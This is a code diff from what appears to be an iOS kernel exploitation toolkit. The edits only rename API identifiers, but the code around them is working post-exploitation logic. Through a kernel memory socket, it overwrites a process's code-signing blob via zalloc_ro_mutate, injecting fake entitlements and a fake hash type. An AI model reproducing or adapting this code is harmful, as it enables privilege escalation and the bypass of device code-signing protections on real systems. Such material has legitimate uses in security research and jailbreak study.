@@ -83,7 +83,7 @@ uintptr_t get_proc_cs_blobs(uintptr_t proc) {
 }
 
 
-void mutate_csblob_entilements_der(xpl_util_kfunc_t kfunc, uintptr_t cs_blob, uintptr_t new_der, uintptr_t new_hash_type) {
+void mutate_csblob_entilements_der(xpl_kfunc_t kfunc, uintptr_t cs_blob, uintptr_t new_der, uintptr_t new_hash_type) {
     uintptr_t temp_buffer;
     xpl_allocator_small_mem_t allocator = xpl_allocator_small_mem_allocate(TYPE_CS_BLOB_SIZE, &temp_buffer);
     xpl_kmem_copy(temp_buffer, cs_blob, TYPE_CS_BLOB_SIZE);
@@ -99,14 +99,14 @@ void mutate_csblob_entilements_der(xpl_util_kfunc_t kfunc, uintptr_t cs_blob, ui
     args[4] = TYPE_CS_BLOB_SIZE;
     
     uintptr_t zalloc_ro_mutate = xpl_slider_kernel_slide(FUNC_ZALLOC_RO_MUTATE_ADDR);
-    xpl_util_kfunc_execute_simple(kfunc, zalloc_ro_mutate, args);
+    xpl_kfunc_execute_simple(kfunc, zalloc_ro_mutate, args);
     
     xpl_allocator_small_mem_destroy(&allocator);
 }
 
 
 int main(int argc, const char * argv[]) {
-    const char* kmem_socket = xpl_DEFAULT_KMEM_SOCKET;
+    const char* kmem_socket = XPL_DEFAULT_KMEM_SOCKET;
     
     int ch;
     while ((ch = getopt(argc, (char**)argv, "k:")) != -1) {
@@ -186,7 +186,7 @@ int main(int argc, const char * argv[]) {
     xpl_kmem_write_uint64(fake_csb_hashtype, TYPE_CS_HASH_MEM_CS_SIZE_OFFSET, 0);
     xpl_log_debug("fake csb_hashtype: %p", (void*)fake_csb_hashtype);
     
-    xpl_util_kfunc_t kfunc = xpl_util_kfunc_create(VAR_ZONE_ARRAY_LEN - 1);
+    xpl_kfunc_t kfunc = xpl_kfunc_create(VAR_ZONE_ARRAY_LEN - 1);
     
     xpl_log_info("setting fake entitlements and hashtype");
     mutate_csblob_entilements_der(kfunc, cs_blob, fake_der_blob, fake_csb_hashtype);
@@ -208,6 +208,6 @@ int main(int argc, const char * argv[]) {
     
     xpl_allocator_small_mem_destroy(&fake_der_allocator);
     xpl_allocator_small_mem_destroy(&fake_csb_hashtype_allocator);
-    xpl_util_kfunc_destroy(&kfunc);
+    xpl_kfunc_destroy(&kfunc);
     return 0;
 }
